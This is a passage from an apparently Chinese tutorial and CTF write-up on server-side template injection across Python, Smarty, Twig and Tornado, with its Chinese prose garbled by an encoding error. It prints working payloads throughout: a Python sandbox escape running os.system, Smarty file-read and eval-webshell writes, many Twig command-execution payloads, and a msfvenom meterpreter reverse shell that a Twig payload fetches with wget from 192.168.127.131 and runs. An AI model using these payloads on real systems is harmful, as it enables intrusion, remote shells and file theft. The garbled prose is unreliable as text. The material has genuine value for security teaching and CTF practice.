é€‰å–å…¶ä¸­ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤ï¼Œ__mro__è¾“å‡ºçˆ¶ç±»ï¼Œæœ€åä¸€ä¸ªçˆ¶ç±»ä¸ºobject &gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72] &lt;class 'site._Printer'&gt; &gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].system('whoami') misaki\\user è¯»å–æ–‡ä»¶ &gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['__builtins__']['file'](\"C:\\\\windows\\\\win.ini\").read()'; for 16-bit app support [fonts] [extensions] [mciextensions] [files] [Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMC=1 MAPIX=1 MAPIXVER=1.0.0.1 OLEMessagin å…¶ä¸­è¿˜å¯ä»¥æ‰§è¡Œçš„æ¨¡å—è¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ä½¿ç”¨å«æœ‰__builtins__çš„å…¶ä»–æ¨¡å—ï¼Œæ¥è°ƒç”¨åŠ è½½çš„osç­‰ã€‚ ç­›é€‰ä»£ç æ¥æºï¼šPythonæ²™ç®±é€ƒé€¸æ€»ç»“ å‚è€ƒï¼šhttps://misakikata.github.io/2020/04/python-æ²™ç®±é€ƒé€¸ä¸SSTI/#python2 äº”ã€PHP-smartyæ¨¡æ¿ Smartyæ˜¯æœ€æµè¡Œçš„PHPæ¨¡æ¿è¯­è¨€ä¹‹ä¸€ï¼Œä¸ºä¸å—ä¿¡ä»»çš„æ¨¡æ¿æ‰§è¡Œæä¾›äº†å®‰å…¨æ¨¡å¼ã€‚è¿™ä¼šå¼ºåˆ¶æ‰§è¡Œåœ¨ php å®‰å…¨å‡½æ•°ç™½åå•ä¸­çš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ¨¡æ¿ä¸­æ— æ³•ç›´æ¥è°ƒç”¨ php ä¸­ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°(ç›¸å½“äºå­˜åœ¨äº†ä¸€ä¸ªdisable_function) ä½†æ˜¯ï¼Œå®é™…ä¸Šå¯¹è¯­è¨€çš„é™åˆ¶å¹¶ä¸èƒ½å½±å“æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬é¦–å…ˆè€ƒè™‘çš„åº”è¯¥æ˜¯æ¨¡æ¿æœ¬èº«ï¼Œæ°å¥½ Smarty å¾ˆç…§é¡¾æˆ‘ä»¬ï¼Œåœ¨é˜…è¯»æ¨¡æ¿çš„æ–‡æ¡£ä»¥åæˆ‘ä»¬å‘ç°ï¼š$smartyå†…ç½®å˜é‡å¯ç”¨äºè®¿é—®å„ç§ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ self å¾—åˆ° smarty è¿™ä¸ªç±»ä»¥åæˆ‘ä»¬å°±å»æ‰¾ smarty ç»™æˆ‘ä»¬çš„çš„æ–¹æ³• smarty/libs/sysplugins/smarty_internal_data.php â€”â€”&gt; getStreamVariable() è¿™ä¸ªæ–¹æ³•å¯ä»¥è·å–ä¼ å…¥å˜é‡çš„æµ è¿™ä¸ªå‡½æ•°æµç¨‹å¤§è‡´ä¸ºï¼šæ‰“å¼€ä½ è¾“å…¥çš„æ–‡ä»¶$variableï¼Œåˆ¤æ–­æ–‡ä»¶åæ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨çš„è¯åœ¨å¾ªç¯ä¸­è¯»å–åˆ°æ–‡ä»¶å…¨éƒ¨å†…å®¹ï¼Œèµ‹å€¼ç»™å˜é‡resultï¼Œå¦‚æœä¸å­˜åœ¨åˆ™çœ‹å˜é‡smartyï¼ŒæŠ›å‡ºä¸åŒé—®é¢˜ï¼Œåˆ†åˆ«ä¸ºï¼Œæ–‡ä»¶ä¸å­˜åœ¨æˆ–è€…æ–‡ä»¶å†…å®¹ä¸ºç©º å› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•è¯»æ–‡ä»¶ï¼Œpayload: {self::getStreamVariable(\"file:///etc/passwd\")} åŒæ · smarty/libs/sysplugins/smarty_internal_write_file.php â€”â€”&gt; Smarty_Internal_Write_File è¿™ä¸ªç±»ä¸­æœ‰ä¸€ä¸ªwriteFileæ–¹æ³• class Smarty_Internal_Write_File { /** * Writes file in a safe way to disk * * @param string $_filepath complete filepath * @param string $_contents file content * @param Smarty $smarty smarty instance * * @throws SmartyException * @return boolean true */ public function writeFile($_filepath, $_contents, Smarty $smarty) { $_error_reporting = error_reporting(); error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING); if ($smarty-&gt;_file_perms !== null) { $old_umask = umask(0); } $_dirpath = dirname($_filepath); // if subdirs, create dir structure if ($_dirpath !== '.' &amp;&amp; !file_exists($_dirpath)) { mkdir($_dirpath, $smarty-&gt;_dir_perms === null ? 0777 : $smarty-&gt;_dir_perms, true); } // write to tmp file, then move to overt file lock race condition $_tmp_file = $_dirpath . DS . str_replace(array('.', ','), '_', uniqid('wrt', true)); if (!file_put_contents($_tmp_file, $_contents)) { error_reporting($_error_reporting); throw new SmartyException(\"unable to write file {$_tmp_file}\"); } /* * Windows' rename() fails if the destination exists, * Linux' rename() properly handles the overwrite. * Simply unlink()ing a file might cause other processes * currently reading that file to fail, but linux' rename() * seems to be smart enough to handle that for us. */ if (Smarty::$_IS_WINDOWS) { // remove original file if (is_file($_filepath)) { @unlink($_filepath); } // rename tmp file $success = @rename($_tmp_file, $_filepath); } else { // rename tmp file $success = @rename($_tmp_file, $_filepath); if (!$success) { // remove original file if (is_file($_filepath)) { @unlink($_filepath); } // rename tmp file $success = @rename($_tmp_file, $_filepath); } } if (!$success) { error_reporting($_error_reporting); throw new SmartyException(\"unable to write file {$_filepath}\"); } if ($smarty-&gt;_file_perms !== null) { // set file permissions chmod($_filepath, $smarty-&gt;_file_perms); umask($old_umask); } error_reporting($_error_reporting); return true; } } å¯ä»¥çœ‹åˆ° writeFile å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°ä¸€ä¸ª Smarty ç±»å‹ï¼Œåæ¥æ‰¾åˆ°äº† self::clearConfig()ï¼Œå‡½æ•°åŸå‹ï¼š public function clearConfig($varname = null) { return Smarty_Internal_Extension_Config::clearConfig($this, $varname); } å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadå†™ä¸ªwebshell: {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"&lt;?php eval($_GET['cmd']); ?&gt;\",self::clearConfig())} CTFåœ°å€ï¼šhttps://buuoj.cn/challengesï¼ˆCISCN2019åä¸œå—èµ›åŒºWeb11ï¼‰ é¢˜ç›®æ¨¡æ‹Ÿäº†ä¸€ä¸ªè·å–IPçš„APIï¼Œå¹¶ä¸”å¯ä»¥åœ¨æœ€ä¸‹æ–¹çœ‹åˆ° â€œBuild With Smarty !â€ å¯ä»¥ç¡®å®šé¡µé¢ä½¿ç”¨çš„æ˜¯Smartyæ¨¡æ¿å¼•æ“ã€‚ åœ¨é¡µé¢çš„å³ä¸Šè§’å‘ç°äº†IPï¼Œä½†æ˜¯é¢˜ç›®ä¸­æ˜¾ç¤ºçš„APIçš„URLç”±äºç¯å¢ƒçš„åŸå› æ— æ³•ä½¿ç”¨ï¼ŒçŒœæµ‹è¿™ä¸ªIPå—X-Forwarded-Forå¤´æ§åˆ¶ã€‚ å°†XFFå¤´æ”¹ä¸º {6*7} ä¼šå‘ç°è¯¥ä½ç½®çš„å€¼å˜ä¸ºäº†42ï¼Œä¾¿å¯ä»¥ç¡®å®šè¿™é‡Œå­˜åœ¨SSTIã€‚ ç›´æ¥æ„é€  {system(â€˜cat /flagâ€™)} å³å¯å¾—åˆ°flag 1. Smarty-SSTIå¸¸è§„åˆ©ç”¨æ–¹å¼ **1. {$smarty.version}** {$smarty.version} #è·å–smartyçš„ç‰ˆæœ¬å· 2. {php}{/php} {php}phpinfo();{/php} #æ‰§è¡Œç›¸åº”çš„phpä»£ç  Smartyæ”¯æŒä½¿ç”¨ {php}{/php} æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯è‡ªç„¶æ˜¯å…ˆæµ‹è¯•è¯¥æ ‡ç­¾ã€‚ä½†å°±è¯¥é¢˜ç›®è€Œè¨€ï¼Œä½¿ç”¨{php}{/php}æ ‡ç­¾ä¼šæŠ¥é”™ï¼š å› ä¸ºåœ¨Smarty3ç‰ˆæœ¬ä¸­å·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚ **3. {literal}** &lt;script language=\"php\"&gt;phpinfo();&lt;/script&gt; è¿™ä¸ªåœ°æ–¹å€ŸåŠ©äº† {literal} è¿™ä¸ªæ ‡ç­¾ï¼Œå› ä¸º {literal} å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚ è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚ä½†æ˜¯è¿™ç§å†™æ³•åªé€‚ç”¨äºphp5ç¯å¢ƒï¼Œè¿™é“ctfä½¿ç”¨çš„æ˜¯php7ï¼Œæ‰€ä»¥ä¾ç„¶å¤±è´¥ 4. getstreamvariable {self::getStreamVariable(\"file:///etc/passwd\")} Smartyç±»çš„getStreamVariableæ–¹æ³•çš„ä»£ç å¦‚ä¸‹ï¼š public function getStreamVariable($variable) { $_result = ''; $fp = fopen($variable, 'r+'); if ($fp) { while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) { $_result .= $current_line; } fclose($fp); return $_result; } $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this; if ($smarty-&gt;error_unassigned) { throw new SmartyException('Undefined stream variable \"' . $variable . '\"'); } else { return null; } } å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•å¯ä»¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶è¿”å›å…¶å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨selfæ¥è·å–Smartyå¯¹è±¡å¹¶è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚ç„¶è€Œä½¿ç”¨è¿™ä¸ªpayloadä¼šè§¦å‘æŠ¥é”™å¦‚ä¸‹ï¼š å¯è§è¿™ä¸ªæ—§ç‰ˆæœ¬Smartyçš„SSTIåˆ©ç”¨æ–¹å¼å¹¶ä¸é€‚ç”¨äºæ–°ç‰ˆæœ¬çš„Smartyã€‚è€Œä¸”åœ¨3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤ã€‚ å¯¹äºé‚£äº›æ–‡ç« æåˆ°çš„åˆ©ç”¨ Smarty_Internal_Write_File ç±»çš„writeFileæ–¹æ³•æ¥å†™shellä¹Ÿç”±äºåŒæ ·çš„åŸå› æ— æ³•ä½¿ç”¨ã€‚ **5. {if}{/if}** {if phpinfo()}{/if} Smartyçš„ {if} æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{/if}ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||*ï¼Œorï¼Œ&amp;&amp;ï¼Œandï¼Œis_array()ç­‰ç­‰ï¼Œå¦‚ï¼š{if is_array($array)}{/if}* æ—¢ç„¶è¿™æ ·å°±å°†XFFå¤´æ”¹ä¸º {if phpinfo()}{/if} ï¼š åŒæ ·è¿˜èƒ½ç”¨æ¥æ‰§è¡Œä¸€äº›ç³»ç»Ÿå‘½ä»¤ï¼š 2. CTFæ¼æ´æˆå›  æœ¬é¢˜ä¸­å¼•å‘SSTIçš„ä»£ç ç®€åŒ–åå¦‚ä¸‹ï¼š &lt;?php require_once('./smarty/libs/' . 'Smarty.class.php'); $smarty = new Smarty(); $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; $smarty-&gt;display(\"string:\".$ip); // displayå‡½æ•°æŠŠæ ‡ç­¾æ›¿æ¢æˆå¯¹è±¡çš„phpå˜é‡ï¼›æ˜¾ç¤ºæ¨¡æ¿ } å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨å­—ç¬¦ä¸²ä»£æ›¿smartyæ¨¡æ¿ï¼Œå¯¼è‡´äº†æ³¨å…¥çš„Smartyæ ‡ç­¾è¢«ç›´æ¥è§£ææ‰§è¡Œï¼Œäº§ç”Ÿäº†SSTIã€‚ 3. PHPçš„æ¨¡æ¿æ³¨å…¥ å¦‚æœæ˜¯åœ¨cookieå¤„æ‰§è¡Œï¼Œæœ€å¥½æŠ“åŒ…æ‰“payloadï¼Œå¯èƒ½æœ‰urlç¼–ç çš„é—®é¢˜ å…­ã€PHP-Bladeæ¨¡æ¿ Blade æ˜¯ Laravel æä¾›çš„ä¸€ä¸ªæ—¢ç®€å•åˆå¼ºå¤§çš„æ¨¡æ¿å¼•æ“ã€‚ å…³äºbladeæ¨¡æ¿è¿™é‡Œä¸å†å¤šè¯´ï¼Œè¯·å‚è€ƒã€Šlaravel Blade æ¨¡æ¿å¼•æ“ã€‹ é‡åˆ°åœ¨å­¦å§â€¦ ä¸ƒã€PHP-Twigå¼•æ“ Twigæ˜¯æ¥è‡ªäºSymfonyçš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒéå¸¸æ˜“äºå®‰è£…å’Œä½¿ç”¨ã€‚å®ƒçš„æ“ä½œæœ‰ç‚¹åƒMustacheå’Œliquidã€‚ egï¼š &lt;?php require_once dirname(__FILE__).'\\twig\\lib\\Twig\\Autoloader.php'; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(\"Hello {{name}}\", array(\"name\" =&gt; $_GET[\"name\"])); // å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå˜é‡çš„å€¼ echo $output; ?&gt; Twigä½¿ç”¨ä¸€ä¸ªåŠ è½½å™¨ loader(Twig_Loader_Array) æ¥å®šä½æ¨¡æ¿ï¼Œä»¥åŠä¸€ä¸ªç¯å¢ƒå˜é‡ environment(Twig_Environment) æ¥å­˜å‚¨é…ç½®ä¿¡æ¯ã€‚ å…¶ä¸­ï¼Œrender() æ–¹æ³•é€šè¿‡å…¶ç¬¬ä¸€ä¸ªå‚æ•°è½½å…¥æ¨¡æ¿ï¼Œå¹¶é€šè¿‡ç¬¬äºŒä¸ªå‚æ•°ä¸­çš„å˜é‡æ¥æ¸²æŸ“æ¨¡æ¿ã€‚ ä½¿ç”¨ Twig æ¨¡ç‰ˆå¼•æ“æ¸²æŸ“é¡µé¢ï¼Œå…¶ä¸­æ¨¡ç‰ˆå«æœ‰ {{name}} å˜é‡ï¼Œå…¶æ¨¡ç‰ˆå˜é‡å€¼æ¥è‡ªäºGETè¯·æ±‚å‚æ•°$_GET[\"name\"] ã€‚ æ˜¾ç„¶è¿™æ®µä»£ç å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œå³ä½¿ä½ æƒ³é€šè¿‡nameå‚æ•°ä¼ é€’ä¸€æ®µJavaScriptä»£ç ç»™æœåŠ¡ç«¯è¿›è¡Œæ¸²æŸ“ï¼Œä¹Ÿè®¸ä½ ä¼šè®¤ä¸ºè¿™é‡Œå¯ä»¥è¿›è¡Œ XSSï¼Œä½†æ˜¯ç”±äºæ¨¡ç‰ˆå¼•æ“ä¸€èˆ¬éƒ½é»˜è®¤å¯¹æ¸²æŸ“çš„å˜é‡å€¼è¿›è¡Œç¼–ç å’Œè½¬ä¹‰ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šé€ æˆè·¨ç«™è„šæœ¬æ”»å‡»: ä½†æ˜¯,å¦‚æœæ¸²æŸ“çš„æ¨¡ç‰ˆå†…å®¹å—åˆ°ç”¨æˆ·çš„æ§åˆ¶,æƒ…å†µå°±ä¸ä¸€æ ·äº†ã€‚ä¿®æ”¹ä»£ç ä¸º: &lt;?php require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php'; Twig_Autoloader::register(true); $twig=newTwig_Environment(newTwig_Loader_String()); $output=$twig-&gt;render(\"Hello {$_GET['name']}\");// å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå†…å®¹çš„ä¸€éƒ¨åˆ† echo $output; ?&gt; ä¸Šé¢è¿™æ®µä»£ç åœ¨æ„å»ºæ¨¡ç‰ˆæ—¶ï¼Œæ‹¼æ¥äº†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡æ¿çš„å†…å®¹ï¼Œç°åœ¨å¦‚æœå†å‘æœåŠ¡ç«¯ç›´æ¥ä¼ é€’ JavaScript ä»£ç ï¼Œç”¨æˆ·è¾“å…¥ä¼šåŸæ ·è¾“å‡ºï¼Œæµ‹è¯•ç»“æœæ˜¾è€Œæ˜“è§: å¦‚æœæœåŠ¡ç«¯å°†ç”¨æˆ·çš„è¾“å…¥ä½œä¸ºäº†æ¨¡æ¿çš„ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆåœ¨é¡µé¢æ¸²æŸ“æ—¶ä¹Ÿå¿…å®šä¼šå°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œæ¨¡ç‰ˆç¼–è¯‘å’Œè§£ææœ€åè¾“å‡ºã€‚ åœ¨Twigæ¨¡æ¿å¼•æ“é‡Œ,ï¼Œ{{var}} é™¤äº†å¯ä»¥è¾“å‡ºä¼ é€’çš„å˜é‡ä»¥å¤–ï¼Œè¿˜èƒ½æ‰§è¡Œä¸€äº›åŸºæœ¬çš„è¡¨è¾¾å¼ç„¶åå°†å…¶ç»“æœä½œä¸ºè¯¥æ¨¡æ¿å˜é‡çš„å€¼ã€‚ ä¾‹å¦‚è¿™é‡Œç”¨æˆ·è¾“å…¥name={{2*10}} ï¼Œåˆ™åœ¨æœåŠ¡ç«¯æ‹¼æ¥çš„æ¨¡ç‰ˆå†…å®¹ä¸º: å°è¯•æ’å…¥ä¸€äº›æ­£å¸¸å­—ç¬¦å’Œ Twig æ¨¡æ¿å¼•æ“é»˜è®¤çš„æ³¨é‡Šç¬¦ï¼Œæ„é€  Payload ä¸º: bmjoker{# comment #}{{2*8}}OK å®é™…æœåŠ¡ç«¯è¦è¿›è¡Œç¼–è¯‘çš„æ¨¡æ¿å°±è¢«æ„é€ ä¸º: bmjoker{# comment #}{{2*8}}OK ç”±äº {# comment #} ä½œä¸º Twig æ¨¡æ¿å¼•æ“çš„é»˜è®¤æ³¨é‡Šå½¢å¼ï¼Œæ‰€ä»¥åœ¨å‰ç«¯è¾“å‡ºçš„æ—¶å€™å¹¶ä¸ä¼šæ˜¾ç¤ºï¼Œè€Œ {{2*8}} ä½œä¸ºæ¨¡æ¿å˜é‡æœ€ç»ˆä¼šè¿”å›16 ä½œä¸ºå…¶å€¼è¿›è¡Œæ˜¾ç¤ºï¼Œå› æ­¤å‰ç«¯æœ€ç»ˆä¼šè¿”å›å†…å®¹ Hello bmjoker16OK é€šè¿‡ä¸Šé¢ä¸¤ä¸ªç®€å•çš„ç¤ºä¾‹,å°±èƒ½å¾—åˆ° SSTI æ‰«ææ£€æµ‹çš„å¤§è‡´æµç¨‹(è¿™é‡Œä»¥ Twig ä¸ºä¾‹): åŒå¸¸è§„çš„ SQL æ³¨å…¥æ£€æµ‹ï¼ŒXSS æ£€æµ‹ä¸€æ ·ï¼Œæ¨¡æ¿æ³¨å…¥æ¼æ´çš„æ£€æµ‹ä¹Ÿæ˜¯å‘ä¼ é€’çš„å‚æ•°ä¸­æ‰¿è½½ç‰¹å®š Payload å¹¶æ ¹æ®è¿”å›çš„å†…å®¹æ¥è¿›è¡Œåˆ¤æ–­çš„ã€‚ æ¯ä¸€ä¸ªæ¨¡æ¿å¼•æ“éƒ½æœ‰ç€è‡ªå·±çš„è¯­æ³•ï¼ŒPayload çš„æ„é€ éœ€è¦é’ˆå¯¹å„ç±»æ¨¡æ¿å¼•æ“åˆ¶å®šå…¶ä¸åŒçš„æ‰«æè§„åˆ™ï¼Œå°±å¦‚åŒ SQL æ³¨å…¥ä¸­æœ‰ç€ä¸åŒçš„æ•°æ®åº“ç±»å‹ä¸€æ ·ã€‚ ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æ›´æ”¹è¯·æ±‚å‚æ•°ä½¿ä¹‹æ‰¿è½½å«æœ‰æ¨¡æ¿å¼•æ“è¯­æ³•çš„ Payloadï¼Œé€šè¿‡é¡µé¢æ¸²æŸ“è¿”å›çš„å†…å®¹æ£€æµ‹æ‰¿è½½çš„ Payload æ˜¯å¦æœ‰å¾—åˆ°ç¼–è¯‘è§£æï¼Œæœ‰è§£æåˆ™å¯ä»¥åˆ¤å®šå«æœ‰ Payload å¯¹åº”æ¨¡æ¿å¼•æ“æ³¨å…¥ï¼Œå¦åˆ™ä¸å­˜åœ¨ SSTIã€‚ å‡¡æ˜¯ä½¿ç”¨æ¨¡æ¿çš„ç½‘ç«™ï¼ŒåŸºæœ¬éƒ½ä¼šå­˜åœ¨SSTIï¼Œåªæ˜¯èƒ½å¦æ§åˆ¶å…¶ä¼ å‚è€Œå·²ã€‚ æ¥ä¸‹æ¥å€ŸåŠ©XVWAçš„ä»£ç æ¥å®è·µæ¼”ç¤ºä¸€ä¸‹SSTIæ³¨å…¥ å¦‚æœåœ¨webé¡µé¢çš„æºä»£ç ä¸­çœ‹åˆ°äº†è¯¸å¦‚ä»¥ä¸‹çš„å­—ç¬¦ï¼Œå°±å¯ä»¥æ¨æ–­ç½‘ç«™ä½¿ç”¨äº†æŸäº›æ¨¡æ¿å¼•æ“æ¥å‘ˆç°æ•°æ® &lt;div&gt;{$what}&lt;/div&gt; &lt;p&gt;Welcome, {{username}}&lt;/p&gt; &lt;div&gt;{%$a%}&lt;/div&gt; ... é€šè¿‡æ³¨å…¥äº†æ¢æµ‹å­—ç¬¦ä¸² $579ï¼Œä»¥æŸ¥çœ‹åº”ç”¨ç¨‹åºæ˜¯å¦è¿›è¡Œäº†ç›¸åº”çš„è®¡ç®—ï¼š æ ¹æ®è¿™ä¸ªå“åº”ï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹è¿™é‡Œä½¿ç”¨äº†æ¨¡æ¿å¼•æ“ï¼Œå› ä¸ºè¿™ç¬¦åˆå®ƒä»¬å¯¹äº {{ }} çš„å¤„ç†æ–¹å¼ åœ¨è¿™é‡Œæä¾›ä¸€ä¸ªé’ˆå¯¹twigçš„æ”»å‡»è½½è·ï¼š {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}} ä½¿ç”¨msfç”Ÿæˆäº†ä¸€ä¸ªphp meterpreteræœ‰æ•ˆè½½è· msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 &gt; /var/www/html/shell.txt msfè¿›è¡Œç›‘å¬ï¼š æ¨¡æ¿æ³¨å…¥è¿œç¨‹ä¸‹è½½shellï¼Œå¹¶é‡å‘½åè¿è¡Œ {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php\")}} ä»¥ä¸Šå°±æ˜¯php twigæ¨¡æ¿æ³¨å…¥ï¼Œç”±äºä»¥ä¸Šä½¿ç”¨çš„twigä¸º2.xç‰ˆæœ¬ï¼Œç°åœ¨å®˜æ–¹å·²ç»æ›´æ–°åˆ°3.xç‰ˆæœ¬ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£æ–°å¢äº† filter å’Œ map ç­‰å†…å®¹ï¼Œè¡¥å……ä¸€äº›æ–°ç‰ˆæœ¬çš„payloadï¼š {{'/etc/passwd'|file_excerpt(1,30)}} {{app.request.files.get(1).__construct('/etc/passwd','')}} {{app.request.files.get(1).openFile.fread(99)}} {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"whoami\")}} {{_self.env.enableDebug()}}{{_self.env.isDebug()}} {{[\"id\"]|map(\"system\")|join(\",\") {{{\"&lt;?php phpinfo();\":\"/var/www/html/shell.php\"}|map(\"file_put_contents\")}} {{[\"id\",0]|sort(\"system\")|join(\",\")}} {{[\"id\"]|filter(\"system\")|join(\",\")}} {{[0,0]|reduce(\"system\",\"id\")|join(\",\")}} {{['cat /etc/passwd']|filter('system')}} å…·ä½“payloadåˆ†æè¯¦è§ï¼šã€ŠTWIG å…¨ç‰ˆæœ¬é€šç”¨ SSTI payloadsã€‹ åˆ©ç”¨payloadä¸ºï¼š msfåå¼¹shell {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}} //idæ˜¯æ‰§è¡Œlinuxå‘½ä»¤çš„åœ°æ–¹ï¼Œè¿™ä¸ªpayloadå¥½åƒåªèƒ½å›æ˜¾æœ€å‰é¢çš„ä¸€ä¸ª è¡¥å……ï¼šTWIG å…¨ç‰ˆæœ¬é€šç”¨ SSTI payloads å…«ã€Python-tornadoæ¨¡æ¿ tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡{{}}è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚ ä»¥ä¸‹ä»£ç å°†å®šä¹‰ä¸€ä¸ªTEMPLATEå˜é‡ä½œä¸ºä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ä¼ å…¥çš„nameæ›¿æ¢æ¨¡æ¿ä¸­çš„\"FOO\"ï¼Œåœ¨è¿›è¡ŒåŠ è½½æ¨¡æ¿å¹¶è¾“å‡ºï¼Œä¸”æœªå¯¹nameå€¼è¿›è¡Œå®‰å…¨æ£€æŸ¥è¾“å…¥æƒ…å†µã€‚ import tornado.template import tornado.ioloop import tornado.web TEMPLATE = ''' &lt;html&gt; &lt;head&gt;&lt;title&gt; Hello {{ name }} &lt;/title&gt;&lt;/head&gt; &lt;body&gt; Hello max &lt;/body&gt; &lt;/html&gt; ''' class MainHandler(tornado.web.RequestHandler): def get(self): name = self.get_argument('name', '') template_data = TEMPLATE.replace(\"FOO\",name) t = tornado.template.Template(template_data) self.write(t.generate(name=name)) application = tornado.web.Application([(r\"/\", MainHandler),], debug=True, static_path=None, template_path=None) if __name__ == '__main__': application.listen(8000) tornado.ioloop.IOLoop.instance().start() è¿™é‡Œæ‹¿ä¸€é“BUUCTFçš„é¢˜æ¥æ¼”ç¤ºä¸€ä¸‹tornado renderæ¨¡æ¿æ³¨å…¥ï¼š [æŠ¤ç½‘æ¯ 2018]easy_tornado æ ¹æ®ä¸Šé¢çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬çŸ¥é“flagåœ¨/fllllllllllllagæ–‡ä»¶ä¸­ renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µrenderé…åˆTornadoä½¿ç”¨ æœ€åå°±æ˜¯è¿™æ®µä»£ç md5(cookie_secret+md5(filename))ï¼Œå†æ¥åˆ†ææˆ‘ä»¬è®¿é—®çš„é“¾æ¥ï¼š http://313ac7f3-c560-4d46-b1ff-daa279729980.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=27eda9bc17cbe1b856e6d541e10c16ea æ¨æµ‹md5åŠ å¯†è¿‡åçš„å€¼å°±æ˜¯urlä¸­filehashå¯¹åº”çš„å€¼ï¼Œæƒ³è·å¾—flagåªè¦æˆ‘ä»¬åœ¨filenameä¸­ä¼ å…¥/fllllllllllllagæ–‡ä»¶å’Œfilehashï¼Œæ‰€ä»¥å…³é”®æ˜¯è·å–cookie_secret åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œæ¯”å¦‚ 